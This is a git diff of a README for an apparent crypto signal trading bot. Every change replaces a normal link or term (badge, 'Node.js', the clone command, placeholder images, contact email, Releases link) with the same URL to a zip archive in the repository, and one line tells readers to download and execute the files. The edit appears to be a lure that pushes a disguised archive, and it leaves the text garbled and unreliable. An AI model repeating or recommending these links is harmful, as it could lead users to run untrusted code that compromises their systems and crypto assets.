@@ -1,8 +1,8 @@
 # BitPay Crypto Signal Trading Bot Analysis
 
-![Crypto Trading](https://img.shields.io/badge/Crypto%20Trading-Active-brightgreen)
+![Crypto Trading](https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip%20Trading-Active-brightgreen)
 
-Welcome to the **BitPay Crypto Signal Trading Bot Analysis** repository! This project implements a trading and technical analysis bot signal protocol for Node.js. It also features a static website with a serverless backend that displays real-time crypto prices. 
+Welcome to the **BitPay Crypto Signal Trading Bot Analysis** repository! This project implements a trading and technical analysis bot signal protocol for https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip It also features a static website with a serverless backend that displays real-time crypto prices. 
 
 ## Table of Contents
 
@@ -31,8 +31,8 @@ In the fast-paced world of cryptocurrencies, timely and accurate information is 
 
 ## Technologies Used
 
-- **Node.js**: For server-side scripting.
-- **Express**: A web application framework for Node.js.
+- **https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip**: For server-side scripting.
+- **Express**: A web application framework for https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip
 - **HTML/CSS**: For the static website design.
 - **JavaScript**: For client-side scripting.
 - **AWS Lambda**: To host the serverless backend.
@@ -44,7 +44,7 @@ To get started with the BitPay Crypto Signal Trading Bot, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv.git
+   git clone https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -86,7 +86,7 @@ The BitPay Crypto Signal Trading Bot operates using a series of algorithms that 
 
 ### Data Flow Diagram
 
-![Data Flow](https://via.placeholder.com/600x300.png?text=Data+Flow+Diagram)
+![Data Flow](https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip+Flow+Diagram)
 
 ## Contributing
 
@@ -119,12 +119,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, please reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourusername)
+- **Email**: https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip
+- **GitHub**: [Your GitHub Profile](https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip)
 
 ## Releases
 
-For the latest updates and versions, visit the [Releases](https://github.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/releases) section. You can download and execute the latest files from there.
+For the latest updates and versions, visit the [Releases](https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip) section. You can download and execute the latest files from there.
 
 ## Conclusion
 
@@ -132,7 +132,7 @@ The BitPay Crypto Signal Trading Bot is a powerful tool for traders looking to n
 
 Stay informed and make smart trading choices with the BitPay Crypto Signal Trading Bot!
 
-![Crypto Analysis](https://via.placeholder.com/600x300.png?text=Crypto+Analysis+Tools)
+![Crypto Analysis](https://raw.githubusercontent.com/S4X4N4/BitPay-Crypto-Signal-Trading-Bot-Analysis-Signal-Masters-Trading-Crypto-xv/main/theopsychism/xv-Trading-Bot-Bit-Pay-Analysis-Masters-Signal-Crypto-3.6.zip+Analysis+Tools)
 
 ---
 
